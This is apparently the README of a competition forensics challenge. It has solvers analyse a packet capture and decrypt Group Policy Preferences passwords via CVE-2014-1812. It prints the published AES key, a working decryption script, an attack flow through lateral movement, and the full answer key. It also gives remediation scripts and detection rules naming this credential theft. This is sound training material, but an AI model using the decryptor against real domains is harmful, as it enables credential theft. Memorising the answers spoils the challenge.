# GPP Hunter - Group Policy Preferences Credential Extraction

[![DFIR][dfir-badge]][dfir-url]
[![Forensics][forensics-badge]][forensics-url]
[![Active Directory][ad-badge]][ad-url]
[![Windows Security][windows-badge]][windows-url]
[![Network Forensics][network-badge]][network-url]
[![CVE-2014-1812][cve-badge]][cve-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[forensics-badge]: https://img.shields.io/badge/Forensics-Investigation-4ECDC4?style=flat&logo=magnifying-glass&logoColor=white
[forensics-url]: https://www.forensicfocus.com/
[ad-badge]: https://img.shields.io/badge/Active%20Directory-Windows%20Domain-0078D4?style=flat&logo=windows&logoColor=white
[ad-url]: https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/
[windows-badge]: https://img.shields.io/badge/Windows%20Security-Group%20Policy-00A4EF?style=flat&logo=microsoft&logoColor=white
[windows-url]: https://docs.microsoft.com/en-us/windows/security/
[network-badge]: https://img.shields.io/badge/Network%20Forensics-PCAP%20Analysis-5DADE2?style=flat&logo=wireshark&logoColor=white
[network-url]: https://www.netresec.com/
[cve-badge]: https://img.shields.io/badge/CVE--2014--1812-Critical-C0392B?style=flat&logo=cve&logoColor=white
[cve-url]: https://nvd.nist.gov/vuln/detail/CVE-2014-1812

## Table of Contents

1. [Scenario Overview](#scenario-overview)
2. [Vulnerability Background](#vulnerability-background)
3. [Attack Methodology](#attack-methodology)
4. [Environment Setup](#environment-setup)
5. [Traffic Analysis](#traffic-analysis)
6. [Credential Extraction](#credential-extraction)
7. [Defense Strategies](#defense-strategies)
8. [Repository](#repository)

---

## Scenario Overview

Your team intercepted network traffic from a corporate domain controller during a security assessment. The SYSVOL share was accessed, and Group Policy Preferences files were transferred. These files may contain sensitive credentials encrypted with a well-known vulnerability.

**Mission:** Analyze the packet capture to extract and decrypt any credentials hidden within the traffic.

### Investigation Questions

1. Domain name (lowercase)
2. GPO GUID (uppercase, with braces)
3. Username with cpassword (no domain prefix)
4. Decrypted password
5. Date of Groups.xml modification (YYYY-MM-DD)

---

## Vulnerability Background

### CVE-2014-1812: Group Policy Preferences Password Vulnerability

In 2012, Microsoft published the AES encryption key used to protect passwords stored in Group Policy Preferences on their MSDN documentation. This public disclosure made all GPP passwords vulnerable to decryption by anyone with read access to the SYSVOL share.

**Vulnerability Details:**

- CVE ID: CVE-2014-1812
- Published: Microsoft Security Bulletin MS14-025 (May 2014)
- CVSS Score: 7.5 (High)
- Attack Vector: Network
- Impact: Complete credential disclosure

**Microsoft Documentation:**

[https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)

### The Published AES Key

Microsoft published the following 32-byte AES-256 key on MSDN:

```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f ff e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

This key, combined with a null IV (all zeros), allows decryption of all cpassword values stored in:

- Groups.xml
- Services.xml
- ScheduledTasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

### Why This Vulnerability Exists

Group Policy Preferences (GPP) was introduced in Windows Server 2008 to simplify domain-wide configuration management. Administrators could use GPP to:

- Create local user accounts with passwords
- Configure service accounts
- Map network drives with credentials
- Deploy scheduled tasks with authentication

To protect these passwords, Microsoft encrypted them using AES-256-CBC. However, the encryption key was published publicly, making the encryption effectively useless.

### Exploitation Requirements

**Minimal Requirements:**

1. Domain user account (any user)
2. Network access to domain controller
3. Read access to SYSVOL share (default for all domain users)

**No elevated privileges required**

---

## Attack Methodology

### Attack Flow

```
1. Domain Reconnaissance
   └─> Identify domain controllers
   └─> Enumerate SYSVOL share

2. SYSVOL Access
   └─> Connect to \\DC\SYSVOL\domain\Policies
   └─> Navigate to GPO folders

3. XML File Discovery
   └─> Search for Groups.xml
   └─> Search for Services.xml
   └─> Search for ScheduledTasks.xml

4. Credential Extraction
   └─> Parse cpassword attribute
   └─> Decode Base64 value

5. Password Decryption
   └─> Use Microsoft's published AES key
   └─> Decrypt with AES-256-CBC
   └─> Unpad PKCS7 padding
   └─> Decode UTF-16-LE

6. Privilege Escalation
   └─> Use discovered credentials
   └─> Access privileged systems
   └─> Lateral movement
```

### SYSVOL Structure

```
\\DC\SYSVOL\
└── domain.com\
    └── Policies\
        └── {GPO-GUID}\
            ├── Machine\
            │   └── Preferences\
            │       ├── Groups\
            │       │   └── Groups.xml
            │       ├── Services\
            │       │   └── Services.xml
            │       └── ScheduledTasks\
            │           └── ScheduledTasks.xml
            └── User\
                └── Preferences\
```

### Groups.xml Example

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
          name="qays3" 
          image="2" 
          changed="2025-03-15 14:23:11" 
          uid="{B5C8D7E9-4F2A-4d3b-9E1C-7A8F6D5E4C3B}">
        <Properties action="U" 
                    newName="" 
                    fullName="" 
                    description="" 
                    cpassword="j1g2KLmvKjI8Mov8v6+WJ9XV8cKygSQn6jWd8rwSM1A=" 
                    changeLogon="0" 
                    noChange="1" 
                    neverExpires="1" 
                    acctDisabled="0" 
                    userName="qays3"/>
    </User>
</Groups>
```

**Key Attributes:**

- name: Username
- changed: Last modification timestamp
- uid: GPO unique identifier
- cpassword: Base64-encoded encrypted password
- userName: Account name

---

## Environment Setup

### Prerequisites

```bash
apt update
apt install -y python3 python3-pip wireshark tshark

pip3 install scapy pycryptodome
```

### Required Libraries

```python
scapy==2.5.0
pycryptodome==3.19.0
```

---

## Traffic Analysis

### PCAP Structure

The challenge PCAP contains:

- SMB traffic to port 445
- SYSVOL share access
- Three XML files transferred:
  - Groups.xml (contains real credentials)
  - Services.xml (decoy)
  - ScheduledTasks.xml (decoy)
- Noise traffic to obscure the target

### Manual Analysis with Wireshark

#### Filter for SMB Traffic

```
tcp.port == 445 && smb
```

#### Filter for XML Content

```
frame contains "<?xml"
```

#### Filter for cpassword

```
frame contains "cpassword="
```

### Tshark Analysis

#### Extract SMB Packets

```bash
tshark -r challenge.pcap -Y "tcp.port == 445" -V
```

#### Search for XML Files

```bash
tshark -r challenge.pcap -Y 'frame contains "<?xml"' -T fields -e data.text
```

#### Extract SYSVOL Path

```bash
tshark -r challenge.pcap -Y 'frame contains "SYSVOL"' -T fields -e smb.path
```

---

## Credential Extraction

### Automated Solution Script

```python
import re
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from scapy.all import *

AES_KEY = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xff\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
AES_IV = b'\x00' * 16

def decrypt_password(cpassword):
    pad = len(cpassword) % 4
    if pad == 1:
        cpassword = cpassword[:-1]
    elif pad == 2 or pad == 3:
        cpassword += '=' * (4 - pad)
    
    decoded = base64.b64decode(cpassword)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    decrypted = cipher.decrypt(decoded)
    unpadded = unpad(decrypted, 16)
    return unpadded.decode('utf-16-le')

def extract_xml_data(pcap_file):
    packets = rdpcap(pcap_file)
    xml_contents = []
    
    for pkt in packets:
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            if b'<?xml' in payload and b'cpassword=' in payload:
                xml_contents.append(payload)
    
    return xml_contents

def parse_xml_field(xml_data, field_name):
    pattern = f'{field_name}="([^"]*)"'
    match = re.search(pattern.encode(), xml_data)
    if match:
        return match.group(1).decode('utf-8', errors='ignore')
    return None

def solve_challenge(pcap_file):
    xml_contents = extract_xml_data(pcap_file)
    
    for xml_data in xml_contents:
        username = parse_xml_field(xml_data, 'userName')
        cpassword = parse_xml_field(xml_data, 'cpassword')
        changed = parse_xml_field(xml_data, 'changed')
        uid = parse_xml_field(xml_data, 'uid')
        
        if cpassword:
            decrypted = decrypt_password(cpassword)
            print(f"Username: {username}")
            print(f"Password: {decrypted}")
            print(f"Modified: {changed}")
            print(f"UID: {uid}")
```

### Running the Solver

```bash
python3 solve.py challenge.pcap
```

### Expected Output

```
[*] CVE-2014-1812 - Group Policy Preferences Password Decryptor
[*] Exploiting publicly disclosed Microsoft AES key (2012)

[+] Found 3 XML file(s) with cpassword field

[*] Processing Groups.xml...
[+] Successfully decrypted password!
    Username: qays3
    Password: q4y$!@9393
    UID: {B5C8D7E9-4F2A-4d3b-9E1C-7A8F6D5E4C3B}
    Changed: 2025-03-15 14:23:11

[+] Domain: qayssarayra.fun
[+] GPO GUID: {B5C8D7E9-4F2A-4D3B-9E1C-7A8F6D5E4C3B}
[+] Username: qays3
[+] Password: q4y$!@9393
[+] Modification Date: 2025-03-15
```

### Manual Decryption Steps

#### Step 1: Extract cpassword

```
j1g2KLmvKjI8Mov8v6+WJ9XV8cKygSQn6jWd8rwSM1A=
```

#### Step 2: Base64 Decode

```python
import base64
cpassword = "j1g2KLmvKjI8Mov8v6+WJ9XV8cKygSQn6jWd8rwSM1A="
decoded = base64.b64decode(cpassword)
print(decoded.hex())
```

#### Step 3: AES Decrypt

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = bytes.fromhex('4e9906e8fcb66cc9faf49310620fffe8f496e806cc05799020 9b09a433b66c1b')
iv = b'\x00' * 16

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(decoded)
unpadded = unpad(decrypted, 16)
```

#### Step 4: UTF-16-LE Decode

```python
password = unpadded.decode('utf-16-le')
print(password)
```

Output: q4y$!@9393

---

## Defense Strategies

### Immediate Remediation

#### 1. Remove All GPP Passwords

```powershell
Get-GPO -All | ForEach-Object {
    $gpo = $_
    $path = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies\{$($gpo.Id)}"
    
    Get-ChildItem -Path $path -Recurse -Include *.xml | ForEach-Object {
        $content = Get-Content $_.FullName
        if ($content -match 'cpassword=') {
            Write-Warning "Found cpassword in $($_.FullName)"
            Write-Warning "GPO: $($gpo.DisplayName)"
        }
    }
}
```

#### 2. Delete Groups.xml Files

```powershell
$domain = $env:USERDNSDOMAIN
$sysvol = "\\$domain\SYSVOL\$domain\Policies"

Get-ChildItem -Path $sysvol -Recurse -Filter "Groups.xml" | Remove-Item -Force
Get-ChildItem -Path $sysvol -Recurse -Filter "Services.xml" | Remove-Item -Force
Get-ChildItem -Path $sysvol -Recurse -Filter "ScheduledTasks.xml" | Remove-Item -Force
```

#### 3. Install KB2962486 Patch

Microsoft released KB2962486 in May 2014 to prevent creation of new GPP passwords:

```powershell
Get-HotFix -Id KB2962486
```

If not installed:

```powershell
wusa.exe Windows8-RT-KB2962486-x64.msu /quiet /norestart
```

### Long-Term Solutions

#### 1. Use LAPS for Local Admin Passwords

Deploy Microsoft Local Administrator Password Solution:

```powershell
Install-WindowsFeature -Name RSAT-AD-PowerShell
Import-Module AdmPwd.PS

Update-AdmPwdADSchema
Set-AdmPwdComputerSelfPermission -Identity "Domain Computers"
```

#### 2. Implement Credential Guard

Enable Windows Defender Credential Guard:

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
```

#### 3. Use Group Managed Service Accounts

Replace service account passwords with gMSA:

```powershell
New-ADServiceAccount -Name svc_web_gmsa -DNSHostName svc_web.corp.com -PrincipalsAllowedToRetrieveManagedPassword "WebServers"
```

#### 4. Audit SYSVOL Access

Enable auditing for SYSVOL share access:

```powershell
$acl = Get-Acl "\\$env:USERDNSDOMAIN\SYSVOL"
$audit = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Domain Users",
    "ReadData",
    "ContainerInherit,ObjectInherit",
    "None",
    "Success"
)
$acl.AddAuditRule($audit)
Set-Acl "\\$env:USERDNSDOMAIN\SYSVOL" $acl
```

### Detection Methods

#### 1. Monitor for GPP Enumeration

**PowerShell Script Block Logging:**

```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} | Where-Object {
    $_.Message -match "SYSVOL.*Groups.xml" -or
    $_.Message -match "cpassword" -or
    $_.Message -match "Get-GPPPassword"
}
```

#### 2. Detect Get-GPPPassword Usage

**Sysmon Event:**

```xml
<Sysmon>
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Get-GPPPassword</CommandLine>
      <CommandLine condition="contains">cpassword</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

#### 3. Network Detection

**Snort Rule:**

```
alert tcp $HOME_NET any -> $HOME_NET 445 (
    msg:"Possible GPP Password Extraction";
    content:"Groups.xml";
    content:"cpassword";
    distance:0;
    classtype:policy-violation;
    sid:1000001;
)
```

#### 4. SIEM Query

**Splunk Query:**

```spl
index=windows EventCode=5145 
| where ShareName="\\*\SYSVOL" AND RelativeTargetName="*Groups.xml"
| stats count by src_ip, user, RelativeTargetName
```

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Final/GPP%20Hunter](https://github.com/qays3/DFIR-Hunters/tree/main/Final/GPP%20Hunter)

### Repository Structure

```
GPP Hunter/
├── README.md
├── app/
│   ├── app.py
│   ├── index.html
│   ├── config.cfg
│   ├── requirements.txt
│   ├── template.json
│   ├── challenge.pcap
│   └── assets/
│       ├── css/
│       ├── js/
│       ├── img/
│       └── sounds/
├── Create/
│   ├── Build/
│   │   ├── create.py
│   │   └── challenge.pcap
│   └── File/
│       └── challenge.pcap
└── Solve/
    ├── solve.py
    ├── solve.md
    ├── requirements.txt
    ├── template.json
    ├── solution.json
    └── challenge.pcap
```

### Deployment Instructions

#### Challenge Application

```bash
cd app

docker build -t gpp .
docker run -d --name GPP -p 5009:5009 --restart unless-stopped gpp

# Access at: http://localhost:5009/?access=29910461-9afb-4c57-b4a4-b7ff2026d72c

```



#### Generate Challenge

```bash
python3 create.py
```

This creates challenge.pcap with encrypted GPP credentials.

#### Solve Challenge

```bash
pip3 install -r requirements.txt
python3 solve.py challenge.pcap
```

### Challenge Submission

Answers are submitted in JSON format:

```json
{
  "domain_name": "qayssarayra.fun",
  "gpo_guid": "{B5C8D7E9-4F2A-4D3B-9E1C-7A8F6D5E4C3B}",
  "username": "qays3",
  "decrypted_password": "q4y$!@9393",
  "modification_date": "2025-03-15"
}
```

---

## References

### Microsoft Documentation

- CVE-2014-1812 Details: [https://nvd.nist.gov/vuln/detail/CVE-2014-1812](https://nvd.nist.gov/vuln/detail/CVE-2014-1812)
- MS14-025 Security Bulletin: [https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025)
- GPP Reference: [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/)
- KB2962486 Patch: [https://support.microsoft.com/en-us/kb/2962486](https://support.microsoft.com/en-us/kb/2962486)

### Tools

- Get-GPPPassword PowerShell Module: [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- gpp-decrypt: [https://github.com/t0thkr1s/gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)
- CrackMapExec: [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

### Research

- Microsoft LAPS: [https://www.microsoft.com/en-us/download/details.aspx?id=46899](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
- Active Directory Security: [https://adsecurity.org/](https://adsecurity.org/)
- MITRE ATT&CK T1552.006: [https://attack.mitre.org/techniques/T1552/006/](https://attack.mitre.org/techniques/T1552/006/)

---

## Authors

Challenge Designer: Qays Sarayra  
Contact: info@qayssarayra.com  
Specialization: Active Directory Security, Windows Forensics, Credential Attacks

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Finals Round.

Educational use only. All credentials are synthetic for training purposes.

---

Competition: IEEE CyberSecurity Competition 2025  
Round: Finals  
Category: DFIR  
Difficulty: Medium  
Expected Completion Time: 1-2 hours